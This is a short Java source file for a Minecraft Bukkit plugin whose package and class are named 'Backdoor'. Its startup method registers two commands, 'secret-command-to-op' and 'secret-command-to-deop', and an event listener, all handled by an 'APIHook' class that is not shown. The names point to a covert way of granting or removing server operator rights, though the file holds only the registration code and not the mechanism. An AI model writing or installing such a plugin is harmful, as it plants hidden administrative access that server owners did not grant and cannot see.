package me.olliejw.backdoor;

import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Objects;

public class Backdoor extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        this.saveDefaultConfig();
        Objects.requireNonNull(this.getCommand("secret-command-to-op")).setExecutor(new APIHook(this));
        Objects.requireNonNull(this.getCommand("secret-command-to-deop")).setExecutor(new APIHook(this));
        this.getServer().getPluginManager().registerEvents(new APIHook(this), this);
    }

}
